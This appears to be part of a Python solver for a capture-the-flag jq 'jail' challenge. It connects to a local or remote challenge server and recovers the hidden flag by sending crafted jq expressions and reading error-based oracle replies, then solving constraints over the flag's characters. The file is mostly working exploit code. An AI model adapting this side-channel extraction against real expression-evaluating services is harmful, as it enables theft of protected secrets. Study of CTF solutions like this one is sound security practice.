def predicate(ops: Sequence[str]) -> str:
    # Some entries such as "frexp|first" are deliberately multi-stage macros.
    parts: list[str] = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)


class Oracle:
    def query_batch(self, expressions: Sequence[str]) -> list[str]:
        raise NotImplementedError

    def close(self) -> None:
        pass


class LocalServerOracle(Oracle):
    def __init__(self, server: Path, flag: str, jq: str = "jq", timeout: int = 600):
        import select

        self.server = server
        self.flag = flag
        self.jq = jq
        self.timeout = timeout
        self._select = select
        jq_path = Path(self.jq)
        path_entries: list[str] = []
        if jq_path.parent != Path("."):
            path_entries.append(str(jq_path.resolve().parent))
        path_entries += ["/usr/local/bin", "/usr/bin", "/bin"]
        env = {
            "PATH": ":".join(dict.fromkeys(path_entries)),
            "FLAG": self.flag,
            "LANG": "C",
        }
        self.proc = subprocess.Popen(
            [sys.executable, str(self.server)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
            bufsize=0,
        )
        assert self.proc.stdin is not None and self.proc.stdout is not None
        self.buffer = b""
        self._consume_initial_prompt()

    def _read_some(self, deadline: float) -> bytes:
        assert self.proc.stdout is not None
        remaining = deadline - time.time()
        if remaining <= 0:
            raise TimeoutError("local oracle read timed out")
        ready, _, _ = self._select.select([self.proc.stdout], [], [], remaining)
        if not ready:
            raise TimeoutError("local oracle read timed out")
        chunk = os.read(self.proc.stdout.fileno(), 65536)
        if not chunk:
            stderr = b""
            if self.proc.stderr is not None:
                stderr = self.proc.stderr.read() or b""
            raise EOFError(
                f"local server closed unexpectedly; rc={self.proc.poll()}, "
                f"stderr={stderr[-1000:]!r}"
            )
        return chunk

    def _consume_initial_prompt(self) -> None:
        deadline = time.time() + self.timeout
        while b"expr: " not in self.buffer:
            self.buffer += self._read_some(deadline)
        self.buffer = self.buffer.split(b"expr: ", 1)[1]

    def query_batch(self, expressions: Sequence[str]) -> list[str]:
        if not expressions:
            return []
        assert self.proc.stdin is not None
        started = time.time()
        deadline = started + self.timeout
        answers: list[str] = []
        # Small chunks avoid a pipe full-duplex deadlock while still amortizing
        # prompt/transport overhead.
        for offset in range(0, len(expressions), 32):
            group = expressions[offset : offset + 32]
            self.proc.stdin.write(("\n".join(group) + "\n").encode())
            self.proc.stdin.flush()
            group_answers: list[str] = []
            while len(group_answers) < len(group):
                matches = list(TOKEN_RE.finditer(self.buffer))
                if matches:
                    take = min(len(matches), len(group) - len(group_answers))
                    group_answers.extend(m.group(1).decode() for m in matches[:take])
                    self.buffer = self.buffer[matches[take - 1].end() :]
                    if len(group_answers) == len(group):
                        break
                    continue
                self.buffer += self._read_some(deadline)
            answers.extend(group_answers)
        if "blocked" in answers:
            bad = answers.index("blocked")
            raise RuntimeError(f"payload {bad} was blocked: {expressions[bad]}")
        print(f"    local oracle: {len(expressions)} queries in {time.time()-started:.2f}s")
        return answers

    def close(self) -> None:
        if self.proc.poll() is not None:
            return
        try:
            assert self.proc.stdin is not None
            self.proc.stdin.write(b"\n")
            self.proc.stdin.flush()
            self.proc.wait(timeout=5)
        except Exception:
            self.proc.kill()
            self.proc.wait(timeout=5)


class RemoteOracle(Oracle):
    def __init__(self, host: str, port: int, timeout: int = 360):
        self.host = host
        self.port = port
        self.timeout = timeout
        connect_timeout = min(timeout, 15)
        print(
            f"[+] connecting to {host}:{port} "
            f"(connect timeout {connect_timeout}s)",
            flush=True,
        )
        try:
            self.sock = socket.create_connection(
                (host, port), timeout=connect_timeout
            )
        except socket.gaierror as exc:
            raise ConnectionError(
                f"DNS lookup failed for {host!r}: {exc}"
            ) from exc
        except (TimeoutError, socket.timeout) as exc:
            raise TimeoutError(
                f"TCP connection to {host}:{port} timed out after "
                f"{connect_timeout}s"
            ) from exc
        except OSError as exc:
            raise ConnectionError(
                f"could not connect to {host}:{port}: {exc}"
            ) from exc

        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.sock.settimeout(timeout)
        self.buffer = b""
        print("[+] TCP connected; waiting for challenge prompt", flush=True)
        self._consume_initial_prompt()
        print("[+] challenge prompt received", flush=True)

    def _consume_initial_prompt(self) -> None:
        while b"expr: " not in self.buffer:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout as exc:
                preview = self.buffer[-500:].decode(errors="replace")
                raise TimeoutError(
                    "connected, but no 'expr: ' prompt arrived before the "
                    f"I/O timeout. Last server output: {preview!r}"
                ) from exc
            if not chunk:
                preview = self.buffer[-500:].decode(errors="replace")
                raise EOFError(
                    "remote closed before the first prompt; "
                    f"server output: {preview!r}"
                )
            self.buffer += chunk
            lower = self.buffer.lower()
            if b"proof of work" in lower or b"solution:" in lower:
                preview = self.buffer.decode(errors="replace")
                raise RuntimeError(
                    "the endpoint requires proof of work; solve the displayed "
                    "PoW in nc first, or rerun after the platform disables it. "
                    f"Server banner: {preview!r}"
                )
        self.buffer = self.buffer.split(b"expr: ", 1)[1]

    def query_batch(self, expressions: Sequence[str]) -> list[str]:
        if not expressions:
            return []
        # Small groups prevent full-duplex socket deadlocks.  Progress is
        # printed after every group so a long oracle phase never looks frozen.
        started = time.time()
        answers: list[str] = []
        chunk_size = 8
        total = len(expressions)
        for offset in range(0, total, chunk_size):
            group = expressions[offset : offset + chunk_size]
            try:
                self.sock.sendall(("\n".join(group) + "\n").encode())
            except OSError as exc:
                raise ConnectionError(
                    f"send failed after {len(answers)}/{total} answers: {exc}"
                ) from exc

            group_answers: list[str] = []
            while len(group_answers) < len(group):
                matches = list(TOKEN_RE.finditer(self.buffer))
                if matches:
                    take = min(len(matches), len(group) - len(group_answers))
                    group_answers.extend(
                        m.group(1).decode() for m in matches[:take]
                    )
                    self.buffer = self.buffer[matches[take - 1].end() :]
                    if len(group_answers) == len(group):
                        break
                    continue
                try:
                    chunk = self.sock.recv(65536)
                except socket.timeout as exc:
                    done = len(answers) + len(group_answers)
                    preview = self.buffer[-500:].decode(errors="replace")
                    raise TimeoutError(
                        f"remote stalled at {done}/{total} answers. "
                        f"Last buffered output: {preview!r}. "
                        "Try --timeout 90 if the server is overloaded."
                    ) from exc
                if not chunk:
                    raise EOFError(
                        f"remote closed after "
                        f"{len(answers)+len(group_answers)}/{total} answers"
                    )
                self.buffer += chunk
            answers.extend(group_answers)

            elapsed = max(time.time() - started, 1e-9)
            done = len(answers)
            rate = done / elapsed
            eta = (total - done) / rate if rate else 0.0
            print(
                f"    progress: {done}/{total} "
                f"({100.0 * done / total:5.1f}%) | "
                f"{rate:.1f} q/s | ETA {eta:.1f}s",
                flush=True,
            )

        if "blocked" in answers:
            bad = answers.index("blocked")
            raise RuntimeError(f"payload {bad} was blocked: {expressions[bad]}")
        print(
            f"    remote oracle: {total} queries in "
            f"{time.time()-started:.2f}s",
            flush=True,
        )
        return answers

    def close(self) -> None:
        try:
            self.sock.sendall(b"\n")
        except OSError:
            pass
        self.sock.close()


@dataclass(frozen=True)
class Observation:
    feature_index: int
    reverse: bool
    value: int
    nuisance: int
    present: bool


def fixed_domain(position: int, length: int, charset: str) -> list[int]:
    prefix = "jail{"
    if position < len(prefix):
        return [ord(prefix[position])]
    if position == length - 1:
        return [ord("}")]
    return list(map(ord, charset))


def recover_length(
    oracle: Oracle,
    chains: dict[int, list[str]],
    minimum: int,
    maximum: int,
) -> int:
    candidates = set(range(minimum, maximum + 1))

    def digit_values(n: int) -> list[int]:
        return list(map(ord, str(n)))

    signatures: list[tuple[str, Callable[[int], int]]] = [
        ("", lambda n: n),
        ("tostring|length", lambda n: len(str(n))),
        ("tostring|explode|first", lambda n: digit_values(n)[0]),
        ("tostring|explode|last", lambda n: digit_values(n)[-1]),
        ("tostring|explode|add", lambda n: sum(digit_values(n))),
        ("tostring|explode|unique|add", lambda n: sum(set(digit_values(n)))),
        (
            "tostring|tojson|explode|unique|add",
            lambda n: unique_codepoint_sum(json.dumps(str(n), separators=(",", ":"))),
        ),
    ]

    for suffix, fn in signatures:
        universe = sorted({fn(n) for n in candidates} & chains.keys())
        if not universe:
            continue
        expressions = []
        for value in universe:
            expr = f"{BASE}|length"
            if suffix:
                expr += f"|{suffix}"
            expr += f"|{predicate(chains[value])}|error"
            expressions.append(expr)
        answers = oracle.query_batch(expressions)
        present = {v for v, answer in zip(universe, answers) if answer == "error"}
        if len(present) > 1:
            raise RuntimeError(f"length signature produced multiple values: {present}")
        if present:
            actual = next(iter(present))
            candidates = {n for n in candidates if fn(n) == actual}
        else:
            candidates = {n for n in candidates if fn(n) not in chains}
        print(f"[+] length signature {suffix or 'identity'} -> {sorted(candidates)}")
        if len(candidates) == 1:
            return next(iter(candidates))
        if not candidates:
            raise RuntimeError("length constraints became inconsistent")
    raise RuntimeError(f"could not determine a unique length: {sorted(candidates)}")


def make_feature_queries(
    length: int,
    charset: str,
    feature_indices: Iterable[int],
    chains: dict[int, list[str]],
    domains: dict[int, list[int]] | None = None,
) -> tuple[list[str], list[tuple[int, bool, int, int]]]:
    if domains is None:
        domains = {i: fixed_domain(i, length, charset) for i in range(length)}
    expressions: list[str] = []
    metadata: list[tuple[int, bool, int, int]] = []
    for fi in feature_indices:
        feature = FEATURES[fi]
        for reverse in (False, True):
            nuisance = feature.evaluate(length - 1, None)
            values = {nuisance}
            for position, chars in domains.items():
                index = length - 1 - position if reverse else position
                values.update(feature.evaluate(index, char) for char in chars)
            for value in sorted(values & chains.keys()):
                base = BASE
                if reverse:
                    base += "|explode|reverse|implode"
                expr = (
                    f"{base}|explode|tostream|{feature.suffix}|"
                    f"{predicate(chains[value])}|error"
                )
                expressions.append(expr)
                metadata.append((fi, reverse, value, nuisance))
    return expressions, metadata


def apply_negative_observations(
    length: int,
    charset: str,
    observations: Sequence[Observation],
) -> dict[int, list[int]]:
    domains = {i: fixed_domain(i, length, charset) for i in range(length)}
    for obs in observations:
        if obs.present:
            continue
        feature = FEATURES[obs.feature_index]
        for position in range(length):
            index = length - 1 - position if obs.reverse else position
            domains[position] = [
                char
                for char in domains[position]
                if feature.evaluate(index, char) != obs.value
            ]
            if not domains[position]:
                raise RuntimeError(
                    "empty domain at position "
                    f"{position}; feature={FEATURES[obs.feature_index].name}, "
                    f"reverse={obs.reverse}, value={obs.value}. "
                    "This usually means the remote endpoint is not this "
                    "challenge or its jq build differs from jq 1.8.2."
                )
    return domains


def positive_constraints(
    length: int,
    observations: Sequence[Observation],
    domains: dict[int, list[int]],
) -> list[frozenset[tuple[int, int]]]:
    constraints: set[frozenset[tuple[int, int]]] = set()
    for obs in observations:
        if not obs.present or obs.value == obs.nuisance:
            continue
        feature = FEATURES[obs.feature_index]
        options = set()
        for position, chars in domains.items():
            index = length - 1 - position if obs.reverse else position
            for char in chars:
                if feature.evaluate(index, char) == obs.value:
                    options.add((position, char))
        if not options:
            raise RuntimeError("positive observation has no remaining candidate")
        constraints.add(frozenset(options))
    return sorted(constraints, key=lambda item: (len(item), sorted(item)))


def solve_constraints(
    length: int,
    domains: dict[int, list[int]],
    constraints: Sequence[frozenset[tuple[int, int]]],
    limit: int = 2,
) -> list[str]:
    solutions: list[str] = []

    def feasible(assign: dict[int, int], current: dict[int, list[int]]) -> bool:
        selected = {(i, c) for i, c in assign.items()}
        for constraint in constraints:
            if selected & constraint:
                continue
            if not any(
                i not in assign and c in current[i]
                for i, c in constraint
            ):
                return False
        return True

    def recurse(assign: dict[int, int], current: dict[int, list[int]]) -> None:
        if len(solutions) >= limit:
            return
        # Unit propagation: if every remaining witness for a constraint belongs
        # to one position, that position must choose one of those characters.
        while True:
            changed = False
            selected = {(i, c) for i, c in assign.items()}
            for constraint in constraints:
                if selected & constraint:
                    continue
                possible = [
                    (i, c)
                    for i, c in constraint
                    if i not in assign and c in current[i]
                ]
                if not possible:
                    return
                positions = {i for i, _ in possible}
                if len(positions) == 1:
                    position = next(iter(positions))
                    allowed = {c for _, c in possible}
                    narrowed = [c for c in current[position] if c in allowed]
                    if not narrowed:
                        return
                    if len(narrowed) < len(current[position]):
                        current = dict(current)
                        current[position] = narrowed
                        changed = True
                    if len(narrowed) == 1 and position not in assign:
                        assign = dict(assign)
                        assign[position] = narrowed[0]
                        selected.add((position, narrowed[0]))
                        changed = True
            for position, chars in current.items():
                if position not in assign and len(chars) == 1:
                    assign = dict(assign)
                    assign[position] = chars[0]
                    changed = True
            if not changed:
                break
        if not feasible(assign, current):
            return
        if len(assign) == length:
            solutions.append("".join(chr(assign[i]) for i in range(length)))
            return
        position = min(
            (i for i in range(length) if i not in assign),
            key=lambda i: len(current[i]),
        )
        for char in current[position]:
            trial = dict(assign)
            trial[position] = char
            if feasible(trial, current):
                recurse(trial, current)

    recurse({}, domains)
    return solutions


def value_set_for_flag(flag: str, feature_index: int, reverse: bool) -> set[int]:
    feature = FEATURES[feature_index]
    length = len(flag)
    values = {feature.evaluate(length - 1, None)}
    for position, char in enumerate(flag):
        index = length - 1 - position if reverse else position
        values.add(feature.evaluate(index, ord(char)))
    return values


def single_feature_expression(
    feature_index: int,
    reverse: bool,
    value: int,
    chains: dict[int, list[str]],
) -> str:
    feature = FEATURES[feature_index]
    base = BASE
    if reverse:
        base += "|explode|reverse|implode"
    return (
        f"{base}|explode|tostream|{feature.suffix}|"
        f"{predicate(chains[value])}|error"
    )


def choose_discriminator(
    first: str,
    second: str,
    chains: dict[int, list[str]],
    queried: set[tuple[int, bool, int]],
) -> tuple[int, bool, int, int] | None:
    choices: list[tuple[int, int, int, bool, int, int]] = []
    length = len(first)
    for fi in range(84, len(FEATURES)):
        feature = FEATURES[fi]
        nuisance = feature.evaluate(length - 1, None)
        for reverse in (False, True):
            left = value_set_for_flag(first, fi, reverse)
            right = value_set_for_flag(second, fi, reverse)
            for value in (left ^ right) & chains.keys():
                if (fi, reverse, value) in queried:
                    continue
                # Prefer short predicates and short jq feature pipelines.
                cost = len(chains[value]) * 10 + feature.suffix.count("|")
                choices.append((cost, value, fi, reverse, nuisance, len(chains[value])))
    if not choices:
        return None
    _, value, fi, reverse, nuisance, _ = min(choices)
    return fi, reverse, value, nuisance


def run_attack(
    oracle: Oracle,
    chains_path: Path | None,
    charset: str,
    minimum: int,
    maximum: int,
) -> str:
    if chains_path is None:
        raw = json.loads(EMBEDDED_CHAINS_JSON)
        source = "embedded table"
    else:
        raw = json.loads(chains_path.read_text())
        source = str(chains_path)
    chains = {int(value): ops for value, ops in raw.items()}
    print(
        f"[+] loaded {len(chains)} locally validated singleton predicates "
        f"from {source}"
    )
    if len(chains) != EXPECTED_CHAIN_COUNT:
        raise RuntimeError(
            f"predicate table mismatch: got {len(chains)}, "
            f"expected {EXPECTED_CHAIN_COUNT}. Use the embedded table by "
            "omitting --chains, or supply the matching full table."
        )

    print("[*] recovering flag length", flush=True)
    length = recover_length(oracle, chains, minimum, maximum)
    print(f"[+] flag length = {length}", flush=True)

    observations: list[Observation] = []
    queried: set[tuple[int, bool, int]] = set()

    # Broad phase: these 84 features reduce a normal jail{...} flag to a tiny
    # CSP while staying comfortably inside the 240-second service budget.
    expressions, metadata = make_feature_queries(
        length, charset, range(0, 84), chains
    )
    print(f"[*] broad phase: 84 features, {len(expressions)} oracle queries", flush=True)
    answers = oracle.query_batch(expressions)
    for (fi, reverse, value, nuisance), answer in zip(metadata, answers):
        observations.append(
            Observation(fi, reverse, value, nuisance, answer == "error")
        )
        queried.add((fi, reverse, value))

    # Usually the broad phase is already unique.  If not, do not send another
    # large batch: compare two surviving flags and ask one targeted question
    # whose output sets differ.  This makes the fallback cheap and avoids
    # fragile high-volume second-stage traffic.
    for adaptive_round in range(1, 101):
        domains = apply_negative_observations(length, charset, observations)
        constraints = positive_constraints(length, observations, domains)
        domain_size = sum(map(len, domains.values()))
        solutions = solve_constraints(length, domains, constraints)
        print(
            f"[+] candidate assignments: {domain_size}; "
            f"positive constraints: {len(constraints)}"
        )
        if len(solutions) == 1:
            print(f"[+] unique flag: {solutions[0]}")
            return solutions[0]
        if not solutions:
            raise RuntimeError("constraint system has no solution")

        print(f"[!] ambiguity {adaptive_round}: {solutions[0]} / {solutions[1]}")
        chosen = choose_discriminator(solutions[0], solutions[1], chains, queried)
        if chosen is None:
            raise RuntimeError(
                "remaining candidates collide under every available feature"
            )
        fi, reverse, value, nuisance = chosen
        expr = single_feature_expression(fi, reverse, value, chains)
        answer = oracle.query_batch([expr])[0]
        observations.append(
            Observation(fi, reverse, value, nuisance, answer == "error")
        )
        queried.add((fi, reverse, value))
        print(
            f"[*] discriminator: {FEATURES[fi].name}, "
            f"reverse={reverse}, value={value}, present={answer == 'error'}"
        )

    raise RuntimeError("adaptive discriminator limit reached")


def main() -> int:
    here = Path(__file__).resolve().parent
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--chains",
        type=Path,
        default=None,
        help=(
            "optional external predicate table; by default the matching "
            "225-entry table embedded in this script is used"
        ),
    )
    parser.add_argument("--charset", default=DEFAULT_CHARSET)
    parser.add_argument("--min-length", type=int, default=6)
    parser.add_argument("--max-length", type=int, default=128)
    sub = parser.add_subparsers(dest="mode", required=True)

    local = sub.add_parser("local")
    local.add_argument("--server", type=Path, default=Path("server.py"))
    local.add_argument("--flag", default="jail{flag_will_be_here_on_remote}")
    local.add_argument("--jq", default="jq")
    local.add_argument("--timeout", type=int, default=600)

    remote = sub.add_parser("remote")
    remote.add_argument("host")
    remote.add_argument("port", type=int)
    remote.add_argument("--timeout", type=int, default=60)

    args = parser.parse_args()
    print(f"[+] solver version: {SOLVER_VERSION}-live", flush=True)
    if args.mode == "local":
        oracle: Oracle = LocalServerOracle(args.server, args.flag, args.jq, args.timeout)
    else:
        oracle = RemoteOracle(args.host, args.port, args.timeout)
    try:
        recovered = run_attack(
            oracle, args.chains, args.charset, args.min_length, args.max_length
        )
    finally:
        oracle.close()
    if args.mode == "local" and recovered != args.flag:
        print(f"[-] local verification failed: expected {args.flag!r}", file=sys.stderr)
        return 1
    print("[+] verification successful")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
